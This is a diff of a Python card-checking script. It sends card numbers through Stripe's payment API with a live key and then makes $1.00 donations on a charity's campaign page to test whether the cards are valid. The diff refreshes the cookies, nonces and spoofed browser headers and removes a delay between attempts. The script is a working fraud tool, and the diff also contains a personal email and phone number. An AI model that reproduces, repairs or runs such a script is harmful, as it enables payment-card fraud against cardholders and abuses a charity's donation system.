@@ -9,7 +9,6 @@ def Tele(ccx):
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
 	r = requests.session()
-	time.sleep(20)
 
 
 	headers = {
@@ -28,7 +27,7 @@ def Tele(ccx):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 
-	data = f'type=card&billing_details[name]=Hy&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][line2]=Hhh&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=3c8d02d7-7363-4bad-969c-4d15f7d33e9bf74ade&pasted_fields=number&payment_user_agent=stripe.js%2F803162f903%3B+stripe-js-v3%2F803162f903%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=53559&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
+	data = f'type=card&billing_details[name]=Vhhjj&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=16cdf967-fcea-4fa8-8b93-7671e3bb0c2f1f5f86&payment_user_agent=stripe.js%2F803162f903%3B+stripe-js-v3%2F803162f903%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=68545&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
 	pm = r1.json()['id']
@@ -36,11 +35,11 @@ def Tele(ccx):
 
 	cookies = {
             '_ga': 'GA1.1.1027315439.1730043864',
-            'charitable_session': 'aef110cc4f9105e7ed853b595426a622||86400||82800',
             '__stripe_mid': '7d5426db-2192-4323-9eeb-146aa8676b4d905708',
-            '__stripe_sid': '3c8d02d7-7363-4bad-969c-4d15f7d33e9bf74ade',
-            '_ga_M3WG7TPY0P': 'GS1.1.1730043864.1.1.1730044001.0.0.0',
-            '_ga_9S894YGECP': 'GS1.1.1730043863.1.1.1730044004.0.0.0',
+            'charitable_session': '451d2f8ac5d09b8f83616d5246a4d014||86400||82800',
+            '_ga_M3WG7TPY0P': 'GS1.1.1730133627.5.0.1730133627.0.0.0',
+            '_ga_9S894YGECP': 'GS1.1.1730133627.5.0.1730133633.0.0.0',
+            '__stripe_sid': '16cdf967-fcea-4fa8-8b93-7671e3bb0c2f1f5f86',
 	}
 
 	headers = {
@@ -48,35 +47,35 @@ def Tele(ccx):
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': '_ga=GA1.1.1027315439.1730043864; charitable_session=aef110cc4f9105e7ed853b595426a622||86400||82800; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; __stripe_sid=3c8d02d7-7363-4bad-969c-4d15f7d33e9bf74ade; _ga_M3WG7TPY0P=GS1.1.1730043864.1.1.1730044001.0.0.0; _ga_9S894YGECP=GS1.1.1730043863.1.1.1730044004.0.0.0',
+            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=451d2f8ac5d09b8f83616d5246a4d014||86400||82800; _ga_M3WG7TPY0P=GS1.1.1730133627.5.0.1730133627.0.0.0; _ga_9S894YGECP=GS1.1.1730133627.5.0.1730133633.0.0.0; __stripe_sid=16cdf967-fcea-4fa8-8b93-7671e3bb0c2f1f5f86',
             'origin': 'https://needhelped.com',
             'referer': 'https://needhelped.com/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
             'x-requested-with': 'XMLHttpRequest',
 	}
 
 
 	data = {
-            'charitable_form_id': '671e606084fc2',
-            '671e606084fc2': '',
-            '_charitable_donation_nonce': '7879bdccbb',
+            'charitable_form_id': '671fbe7a58161',
+            '671fbe7a58161': '',
+            '_charitable_donation_nonce': '97c5c854f0',
             '_wp_http_referer': '/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
             'campaign_id': '1163',
             'description': 'Christmas: Poor Family Need Help for Mother Teresa’s charity',
-            'ID': '0',
+            'ID': '5322',
             'donation_amount': 'custom',
             'custom_donation_amount': '1.00',
             'first_name': 'Chit',
             'last_name': 'Nge',
             'email': 'saimyataungcr8@gmail.com',
             'address': 'New York',
-            'address_2': 'Hhh',
+            'address_2': '',
             'city': 'New York ',
             'state': 'New York',
             'postcode': '10080',
@@ -99,7 +98,9 @@ def Tele(ccx):
 	except:
 		return 'success' or 'Thank You'
 	return ii
-
+	
+	
+	
 import requests,re
 def Tele2(ccx):
 	import requests
@@ -174,9 +175,10 @@ def Tele2(ccx):
 			cookies=cookies,
 			headers=headers,
 			data=data,
-	)
-	return (r2.json())
-
-
-	
+	).json()
+	try:
+		ii=r2['errors']
+	except:
+		return 'success' or 'Your card does not support this type of purchase'
+	return ii
 	
